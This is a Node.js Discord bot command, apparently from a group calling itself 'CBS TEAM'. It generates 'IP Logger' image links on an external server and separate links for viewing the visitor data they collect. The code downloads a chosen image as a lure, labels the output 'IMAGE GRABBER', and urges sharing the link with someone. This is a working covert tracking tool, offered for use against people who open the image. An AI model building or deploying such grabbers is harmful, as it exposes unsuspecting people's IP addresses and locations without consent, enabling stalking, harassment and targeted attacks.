const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const fs = require('fs');
const path = require('path');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('img')
    .setDescription('📸 Gera um link direto para uma imagem com IP Logger')
    .addStringOption(option =>
      option.setName('link')
        .setDescription('Link da imagem (opcional)')
        .setRequired(false)
    )
    .addAttachmentOption(option =>
      option.setName('imagem')
        .setDescription('Faça upload da imagem')
        .setRequired(false)
    ),

  async execute(interaction, client) {
    if (!interaction.memberPermissions.has('Administrator')) {
      return interaction.reply({ content: '❌ Apenas ADMs.', flags: 64 });
    }

    await interaction.deferReply({ flags: 64 });

    const id = Math.random().toString(36).substring(2, 10);
    const link = `https://cbsteam.onrender.com/img/${id}`;
    const dadosLink = `https://cbsteam.onrender.com/dados/${id}`;

    let imagemLink = interaction.options.getString('link');
    const attachment = interaction.options.getAttachment('imagem');

    // Se tem upload, baixa a imagem e salva na pasta public com o nome do ID
    if (attachment) {
      imagemLink = attachment.url;
      // Baixa a imagem e salva localmente
      try {
        const response = await fetch(imagemLink);
        const buffer = await response.buffer();
        const publicDir = path.join(__dirname, '..', 'public');
        if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
        fs.writeFileSync(path.join(publicDir, `${id}.jpg`), buffer);
        // Guarda o caminho da imagem
        // O servidor vai usar essa imagem quando alguém acessar /img/:id
        // Precisamos salvar o caminho em um arquivo ou em memória
        // Como o servidor é no mesmo processo, podemos usar uma variável global
        global.imageStore = global.imageStore || {};
        global.imageStore[id] = path.join(publicDir, `${id}.jpg`);
      } catch (e) {
        console.error('Erro ao salvar imagem:', e);
      }
    } else if (imagemLink) {
      // É um link externo, não podemos baixar, então usamos redirect para o link
      // Mas para ser um link direto, precisamos que o servidor sirva a imagem.
      // Vamos baixar também:
      try {
        const response = await fetch(imagemLink);
        const buffer = await response.buffer();
        const publicDir = path.join(__dirname, '..', 'public');
        if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
        fs.writeFileSync(path.join(publicDir, `${id}.jpg`), buffer);
        global.imageStore = global.imageStore || {};
        global.imageStore[id] = path.join(publicDir, `${id}.jpg`);
      } catch (e) {
        console.error('Erro ao baixar imagem:', e);
      }
    }

    // Se não tem imagem, usa a padrão
    if (!global.imageStore || !global.imageStore[id]) {
      const publicDir = path.join(__dirname, '..', 'public');
      const padrao = path.join(publicDir, 'imagem.jpg');
      if (fs.existsSync(padrao)) {
        global.imageStore = global.imageStore || {};
        global.imageStore[id] = padrao;
      } else {
        global.imageStore[id] = null; // fallback para GIF
      }
    }

    const embed = new EmbedBuilder()
      .setTitle('📸 IMAGE GRABBER GERADO!')
      .setDescription(`**Link para compartilhar:**\n\`${link}\``)
      .setColor(0xFF0000)
      .addFields(
        { name: '📊 Ver dados', value: `${dadosLink}`, inline: true },
        { name: '🆔 ID', value: `\`${id}\``, inline: true },
        { name: '📝 Dica', value: 'Cole o link no navegador ou compartilhe com alguém!' }
      )
      .setFooter({ text: 'CBS TEAM - Image Grabber' })
      .setTimestamp();

    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel('🔗 Copiar Link')
          .setStyle(ButtonStyle.Primary)
          .setCustomId(`copy_${id}`)
      );

    await interaction.editReply({
      embeds: [embed],
      components: [row]
    });
  }
};